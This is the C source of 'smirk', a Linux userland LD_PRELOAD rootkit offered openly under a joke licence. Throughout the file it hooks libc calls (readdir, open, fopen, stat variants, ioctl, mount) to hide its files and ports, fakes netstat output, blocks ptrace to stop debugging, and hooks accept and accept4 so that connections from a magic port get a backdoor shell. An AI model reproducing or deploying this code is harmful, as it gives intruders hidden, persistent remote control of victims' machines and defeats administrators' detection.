/*
 *    .=.
 *   '==c|  This project is libre, and licenced under the terms of the
 *   [)-+|  DO WHAT THE FUCK YOU WANT TO PUBLIC LICENCE, version 3.1,
 *   //'_|  as published by dtf on July 2019. See the COPYING file or
 *  /]==;\  https://ph.dtf.wtf/w/wtfpl/#version-3-1 for more details.
*/

#include "smirk.h"
#include "utils.h"

/*
 * Function:  init
 * --------------------
 * the constructor checks if exists the killswitch and uninstall the rootkit
 * if there isn't a killswitch file it try to install smirk
 *
 *  returns: nothing
 */
void __attribute ((constructor))
init(void)
{
    #ifdef DEBUG
    printf("[-] constructor\n");
    #endif
    #ifdef KILLSWITCH
    if(!hooked_xstat){
        hooked_xstat = load_libc("__xstat");
    }
    struct stat buffer;
    if (hooked_xstat(_STAT_VER, KILLSWITCH, &buffer) == 0){
        #ifdef DEBUG
        printf("[!] killswitch found!\n");
        #endif
        uninstall();
    } else{
        //install();
    }
    #else
    //install();
    #endif
}

/*
 * Function:  end
 * --------------------
 * just en empty distructor for debug purposes
 * that rug really tied the room together, did it not? :D B.L.
 *
 *  returns: nothing
 */
__attribute__((destructor))
void end (void) {
    #ifdef DEBUG
    printf("\n[-] destructor\n");
    #endif
}

/*
 * Function:  load_libc
 * --------------------
 * dynamically load libc and the specified function
 *
 *  funcname: the function to load
 *
 *  returns: the pointer to the libc function and stores on global "libc" the libc library
 */
void *load_libc(char *funcname){
    if (!libc) {
        libc=dlopen(LIBC, RTLD_LAZY);
    }
    return dlsym(libc, funcname);
}

/*
 * Function:  readdir
 * --------------------
 * readdir hijacking
 * if it find ls.so.preload or a file that starts with MAGIC_PREFIX omits it and clean output
 */
struct dirent *readdir(DIR *dirp)
{
    #ifdef DEBUG
    printf("[-] hooking readdir\n");
    #endif

    if(!hooked_readdir){
        hooked_readdir = load_libc("readdir");
    }

    struct dirent *dir;
    dir = hooked_readdir(dirp);
    
    if(dir == NULL){
        return NULL;
    }

    char filename[PATH_MAX];
    int fn_size;

    // take the filename and removes garbage chars after \0
    for (fn_size = 0; dir->d_name[fn_size] != '\0'; fn_size++){
        filename[fn_size] = dir->d_name[fn_size];
    }
    filename[fn_size] = '\0';
    
    if(is_magicfile(filename)){
        #ifdef DEBUG
        printf("[+] Hiding %s\n",filename);
        #endif
        // clean the string
        for (int x = 0; x <= fn_size; x++){
            dir->d_name[x] = '\0';
        }
        return readdir(dirp);
    }

    return dir;
}

/*
 * Function:  open
 * --------------------
 * open hijacking
 * if it's a network file (netstat case) it filter values with MAGIC_PORT
 * if the file name contains magic prefix it return "file doesn't exists"
 */
int open(const char *pathname, int flags, mode_t mode){
    #ifdef DEBUG
    printf("[-] hooking open %s\n", pathname);
    #endif

    if(!hooked_open){
        hooked_open = load_libc("open");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    // netstat case: hide ports
    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return -1;
        }
        return hooked_open(newfile, flags, mode);
    }

    // killswitch case: don't touch
    #ifdef KILLSWITCH
    else if (strcmp(real_pathname, KILLSWITCH) == 0){
        return hooked_open(real_pathname, flags, mode);
    }
    #endif

    // file with magic prefix
    else if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return -1;
    }

    return hooked_open(pathname, flags, mode);
}

/*
 * Function:  fopen
 * --------------------
 * fopen hijacking
 * if it's a network file (netstat case) it filter values with MAGIC_PORT
 * if the file name contains magic prefix it return "file doesn't exists"
 */
FILE *fopen(const char *pathname, const char *mode)
{
    #ifdef DEBUG
    printf("[-] hooking fopen %s\n", pathname);
    #endif

    if(!hooked_fopen){
        hooked_fopen = load_libc("fopen");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    // netstat case: hide ports
    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return NULL;
        }
        return hooked_fopen(newfile, mode);
    } 
    
    // file with magic prefix
    if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }

    return hooked_fopen(real_pathname, mode);
}

/*
 * Function:  fopen64
 * --------------------
 * fopen64 hijacking
 * if it's a network file (netstat case) it filter values with MAGIC_PORT
 * if the file name contains magic prefix it return "file doesn't exists"
 */
FILE *fopen64(const char *pathname, const char *mode)
{
    #ifdef DEBUG
    printf("[-] hooking fopen64 %s\n", pathname);
    #endif

    if(!hooked_fopen64){
        hooked_fopen64 = load_libc("fopen64");
    }

    char real_pathname[PATH_MAX];
    realpath(pathname,real_pathname);

    // netstat case: hide ports
    if (is_net_file(real_pathname)){
        char newfile[PATH_MAX];
        if (!fake_netstat(real_pathname, newfile)){
            return NULL;
        }
        return hooked_fopen64(newfile, mode);
    }
    
    // file with magic prefix
    if (is_magicfile(real_pathname)){
        errno = ENOENT;
        return NULL;
    }
 
    return hooked_fopen64(real_pathname, mode);
}

/*
 * Function:  is_flag_set
 * --------------------
 * check if the file pointed from fd has the "flags" setted or not 
 *
 *  fd: the file descriptor
 *  flags: the flags to compare
 *
 *  returns: 1 if file flags are set as flags, otherwise 0
 */
int is_flag_set(int fd, unsigned long flags){
    unsigned long argp;

    if(!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    int flag_request = hooked_ioctl(fd, FS_IOC_GETFLAGS, &argp);
    if (flag_request != -1){
        argp = argp & flags;
        if (argp){
            return argp == flags;
        }
        return 0;
    }
    return 0;
}

/*
 * Function:  ioctl
 * --------------------
 * ioctl hijacking
 * if file has flags immutable and append are setted, it's avoid the possibiity to remove them
 * and it doesn't return them on GETFLAGS request
 */
int ioctl(int fd, unsigned long request, unsigned long *argp){
    #ifdef DEBUG
    printf("[-] hooking ioctl\n");
    #endif

    if(!hooked_ioctl){
        hooked_ioctl = load_libc("ioctl");
    }

    // +ia: immutable, append
    unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
    if (is_flag_set(fd, flags)){
        if (request == FS_IOC_SETFLAGS){
            *argp = *argp | flags;
            return hooked_ioctl(fd, request, argp);
        } else if (request == FS_IOC_GETFLAGS){
            int rc = hooked_ioctl(fd, request, argp);
            *argp = *argp &~ flags;
            return rc;
        }
    }

    return hooked_ioctl(fd, request, argp);
}

/*
 * Function:  accept4
 * --------------------
 * accept4 hijacking
 * if connection come from MAGIC_PORT it spawn a shell and redirect output to it
 */
int accept4(int socket, struct sockaddr_in *address, socklen_t *address_len, int flags){
    #ifdef DEBUG
    printf("[-] hooking accept4\n");
    #endif

    if (!hooked_accept4){
        hooked_accept4 = load_libc("accept4");
    }
    int fd = hooked_accept4(socket, address, address_len, flags);
    if (fd == -1){
        return fd;
    }
    int port = (int) ntohs(address->sin_port);
    
    // if connection comes from magic port spawn a shell and redirect I/O
    if (port == MAGIC_PORT){
        #ifdef DEBUG
        printf("[+] port hooked: %d, %d\n", port, fd);
        #endif
        pthread_t thread;
        int *pfd = malloc(sizeof(*pfd));
        *pfd = fd;
        pthread_create(&thread, NULL, backdoor, pfd);
        return accept4(socket, address, address_len, flags);
    }
    return fd;
}

/*
 * Function:  accept
 * --------------------
 * accept hijacking
 * if connection come from MAGIC_PORT it spawn a shell and redirect output to it
 */
int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
    #ifdef DEBUG
    printf("[-] hooking accept\n");
    #endif

    if (!hooked_accept){
        hooked_accept = load_libc("accept");
    }
    int fd = hooked_accept(socket, address, address_len);
    if (fd == -1){
        return fd;
    }
    int port = (int) ntohs(address->sin_port);
    
    // if connection comes from magic port spawn a shell and redirect I/O
    if (port == MAGIC_PORT){
        #ifdef DEBUG
        printf("[+] port hooked: %d, %d\n", port, fd);
        #endif
        pthread_t thread;
        int *pfd = malloc(sizeof(*pfd));
        *pfd = fd;
        pthread_create(&thread, NULL, backdoor, pfd);
        return accept(socket, address, address_len);
    }
    return fd;
}

/*
 * Function: mount
 * --------------------
 * mount hijacking
 * if source or destination are one of the magicfiles it just returns 'ENOENT' (-1)
 * prevents some mount tricks.
 */
int mount(const char *source, const char *target,
          const char *filesystemtype, unsigned long mountflags,
          const void *data){
    
    char realsource[PATH_MAX], realtarget[PATH_MAX];
    realpath(source, realsource);
    realpath(target, realtarget);
    if (is_magicfile(realsource) ||  is_magicfile(realtarget)){
        errno = ENOENT;
        return -1;
    }
    if (!hooked_mount){
        hooked_mount = load_libc("mount");
    }
    return hooked_mount(source, target, filesystemtype, mountflags, data);
}

/*
 * Function: stat
 * --------------------
 * stat hijacking
 * stat just calls __xstat, than call hooked __xstat
 */
int stat(const char *path, struct stat *buf)
{
    #ifdef DEBUG
    printf("[-] hooking stat %s\n", path);
    #endif

    return __xstat(_STAT_VER, path, buf);
}

/*
 * Function: __xstat
 * --------------------
 * __xstat hijacking
 * if __xstat is called check if it's a protected file
 * otherwise it calls the real __xstat
 */
int __xstat(int version, const char *path, struct stat *buf)
{
    #ifdef DEBUG
    printf("[-] hooking xstat %s\n", path);
    #endif
    if ( hooked_xstat == NULL ) {
        hooked_xstat = load_libc("__xstat");
    }

    if (is_badfile(path)){
        return -1;
    }
    return hooked_xstat(version, path, buf);
} 

/*
 * Function: stat64
 * --------------------
 * stat64 hijacking
 * stat64 just calls __xstat64, than call hooked __xstat64
 */
int stat64(const char *path, struct stat64 *buf)
{
    #ifdef DEBUG
    printf("[-] hooking stat64 %s\n", path);
    #endif

    return __xstat64(_STAT_VER, path, buf);
} 

/*
 * Function: __xstat64
 * --------------------
 * __xstat64 hijacking
 * if __xstat64 is called check if it's a protected file
 * otherwise it calls the real __xstat64
 */
int __xstat64(int version, const char *path, struct stat64 *buf)
{
    #ifdef DEBUG
    printf("[-] hooking xstat64 %s\n", path);
    #endif
    if ( hooked_xstat64 == NULL ) {
        hooked_xstat64 = load_libc("__xstat64");
    }

    if (is_badfile(path)){
        return -1;
    }
    return hooked_xstat64(version, path, buf);
} 

/*
 * Function: lstat
 * --------------------
 * lstat hijacking
 * lstat just calls __lxstat, than call hooked __lxstat
 */
int lstat(const char *path, struct stat *buf)
{
    #ifdef DEBUG
    printf("[-] hooking lstat %s\n", path);
    #endif

    return __lxstat(_STAT_VER, path, buf);
} 

/*
 * Function: __lxstat
 * --------------------
 * __lxstat hijacking
 * if __lxstat is called check if it's a protected file
 * otherwise it calls the real __lxstat
 */
int __lxstat(int version, const char *path, struct stat *buf)
{
    #ifdef DEBUG
    printf("[-] hooking lxstat %s\n", path);
    #endif
    if ( hooked_lxstat == NULL ) {
        hooked_lxstat = load_libc("__lxstat");
    }

    if (is_badfile(path)){
        return -1;
    }
    return hooked_lxstat(version, path, buf);
} 

/*
 * Function: lstat64
 * --------------------
 * lstat64 hijacking
 * lstat64 just calls __lxstat64, than call hooked __lxstat64
 */
int lstat64(const char *path, struct stat64 *buf)
{
    #ifdef DEBUG
    printf("[-] hooking lstat64 %s\n", path);
    #endif

    return __lxstat64(_STAT_VER, path, buf);
} 

/*
 * Function: __lxstat64
 * --------------------
 * __lxstat64 hijacking
 * if __lxstat64 is called check if it's a protected file
 * otherwise it calls the real __lxstat64
 */
int __lxstat64(int version, const char *path, struct stat64 *buf)
{
    #ifdef DEBUG
    printf("[-] hooking lxstat64 %s\n", path);
    #endif
    if ( hooked_lxstat64 == NULL ) {
        hooked_lxstat64 = load_libc("__lxstat64");
    }

    if (is_badfile(path)){
        return -1;
    }
    return hooked_lxstat64(version, path, buf);
} 

// #ifndef DEBUG
long ptrace(enum __ptrace_request request, ...){
    #ifdef DEBUG
    printf("[-] hooking ptrace\n");
    #endif
    errno = ESRCH;
    return -1;
}
// #endif
